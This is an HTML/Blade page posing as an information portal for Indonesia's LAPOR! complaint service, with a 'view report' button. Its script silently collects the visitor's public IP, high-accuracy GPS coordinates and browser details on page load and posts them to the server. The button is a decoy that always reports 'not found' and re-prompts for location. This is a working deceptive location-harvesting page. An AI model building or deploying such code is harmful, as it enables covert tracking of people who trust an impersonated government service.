<!DOCTYPE html>
<html>
<head>
    <title>Laporan dari Lapor.go.id</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        .container {
            padding: 20px;
        }
        header {
            background-color: #007bff;
            color: white;
            padding: 10px 0;
            text-align: center;
        }
        h1 {
            font-size: 28px;
        }
        .content {
            margin: 20px 0;
        }
        footer {
            text-align: center;
            padding: 10px;
            background-color: #f1f1f1;
            position: fixed;
            width: 100%;
            bottom: 0;
        }
        .btn {
            background-color: #007bff;
            color: white;
            padding: 10px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #0056b3;
        }
                /* Styling for the button */
        #reportButton {
            position: relative; /* Positioning context for loading spinner */
            padding: 15px 30px;
            font-size: 18px;
            background-color: #007bff; /* Primary button color */
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        #reportButton.loading {
            background-color: #6c757d; /* Disable color */
            cursor: not-allowed; /* Not allowed cursor */
        }

        #loading {
            display: none; /* Initially hidden */
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            position: absolute; /* Position inside the button */
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%); /* Center the spinner */
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        /* Modal styles */
        .modal {
            display: none; /* Hidden by default */
            position: fixed;
            z-index: 1000; /* Sit on top */
            left: 0;
            top: 0;
            width: 100%; /* Full width */
            height: 100%; /* Full height */
            background-color: rgba(0, 0, 0, 0.5); /* Black w/ opacity */
            justify-content: center; /* Center modal */
            align-items: center; /* Center modal */
        }

        .modal-content {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            text-align: center;
        }

        .close {
            margin-top: 15px;
            padding: 10px 20px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <header>
        <h1>Portal Laporan Masyarakat</h1>
    </header>

    <div class="container">
        <h2>Informasi dari Lapor.go.id</h2>
        <div class="content">
            <p>
                LAPOR! adalah platform yang memungkinkan masyarakat untuk mengajukan laporan terkait pelayanan publik secara online.
                Berikut beberapa fitur utama:
            </p>
            <ul>
                <li>Pengaduan pelayanan publik</li>
                <li>Pelaporan masalah sosial</li>
                <li>Fitur tanggapan langsung dari pihak terkait</li>
            </ul>

            <p id="public-ip" style="display: none;">Mendapatkan IP Publik...</p>
            <p id="location" style="display: none;">Mendapatkan lokasi...</p>
                <!-- Button with Loading Icon -->
            <div class="container">
                <button id="reportButton">Lihat Laporan</button>
                <div id="loading"></div>
            </div>
            
        </div>
    </div>
    <!-- Modal -->
    <div id="myModal" class="modal">
        <div class="modal-content">
            <p>Laporan tidak ditemukan!</p>
            <button class="close" id="closeModal">Tutup</button>
        </div>
    </div>
    <footer>
        <p>&copy; 2024 Laporan Masyarakat</p>
    </footer>

    <script>
        // Mendapatkan IP publik
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                document.getElementById('public-ip').innerText = 'IP Publik Anda: ' + data.ip;
            })
            .catch(error => {
                console.error('Error:', error);
                document.getElementById('public-ip').innerText = 'Gagal mendapatkan IP Publik';
            });

        // Fungsi untuk mendapatkan lokasi
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var latitude = position.coords.latitude;
                    var longitude = position.coords.longitude;
                    document.getElementById('location').innerText = 'Latitude: ' + latitude + ', Longitude: ' + longitude;

                    // Mengirim data lokasi ke server
                    sendLocationToServeronly(latitude, longitude);
                    sendLocationToServer(latitude, longitude);
                }, function(error) {
                    console.error('Error mendapatkan lokasi:', error);
					
                }, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                });
            } else {
                console.log('Geolocation tidak didukung oleh browser ini.');
            }
        }

        // Fungsi untuk mengirim data lokasi ke server
        function sendLocationToServer(latitude, longitude) {
            var ipAddress = document.getElementById('public-ip').innerText.split(': ')[1]; // Mengambil IP Publik
            var browserInfo = {
                appName: navigator.appName,
                appVersion: navigator.appVersion,
                platform: navigator.platform,
                userAgent: navigator.userAgent,
                language: navigator.language,
                ipAddress: ipAddress,
                latitude: latitude,
                longitude: longitude
            };

            // Mengirim data ke server dengan Ajax
            fetch("{{ route('save.browser.info') }}", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': '{{ csrf_token() }}',
                },
                body: JSON.stringify(browserInfo)
            })
            .then(response => response.json())
            .then(data => {
                console.log("Informasi lokasi berhasil dikirim!", data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }

        // Memanggil fungsi untuk mendapatkan lokasi saat halaman dimuat
        function sendLocationToServeronly(latitude, longitude) {
            fetch("{{ route('save.location') }}", {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').getAttribute('content')
                },
                body: JSON.stringify({
                    latitude: latitude,
                    longitude: longitude
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log("Data lokasi berhasil disimpan!", data);
            })
            .catch((error) => {
                console.error('Error:', error);
            });
        }
        getLocation();
        function requestGeolocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    // If permission is granted, proceed to the next step
                    handleLocationSuccess(position);
                }, function() {
                    // If permission is denied, inform the user
                    alert("Silakan izinkan akses lokasi untuk melanjutkan.");
                });
            } else {
                alert("Geolocation tidak didukung oleh browser ini.");
            }
        }
        document.getElementById('reportButton').addEventListener('click', function() {
            var button = this;
            var loadingIndicator = document.createElement('div');
            loadingIndicator.id = 'loading';
            button.appendChild(loadingIndicator); // Add loading spinner to button
            button.classList.add('loading'); // Add loading class to button
            button.disabled = true; // Disable button

            // Simulate an AJAX request (replace with your actual request)
            setTimeout(function() {
                // Hide loading indicator and reset button
                loadingIndicator.remove();
                button.classList.remove('loading'); // Remove loading class
                button.disabled = false; // Enable button
                handleLocationSuccess();
            }, 3000); // Simulate 3 seconds loading
        });
        // Function to handle location success
        function handleLocationSuccess(position) {
            // Show the loading spinner
            document.getElementById('loading').style.display = 'inline-block';

            // Simulate a 3-second delay
            setTimeout(function() {
                // Redirect to Google
                showModal();
            }, 3000); // 3000 ms = 3 seconds
        }

        // Function to handle button click
        // document.getElementById('reportButton').addEventListener('click', function() {
        //     // Request geolocation permission
        //     requestGeolocation();
        // });
        // Function to show the modal
        function showModal() {
            document.getElementById('myModal').style.display = 'flex'; // Show modal
        }

        // Function to handle button click
        document.getElementById('reportButton').addEventListener('click', function() {
            // Request geolocation permission
            requestGeolocation();
        });

        // Close modal functionality
        document.getElementById('closeModal').addEventListener('click', function() {
            document.getElementById('myModal').style.display = 'none'; // Hide modal
            document.getElementById('loading').style.display = 'none'; // Hide modal
            getLocation();
        });
    </script>
</body>
</html>
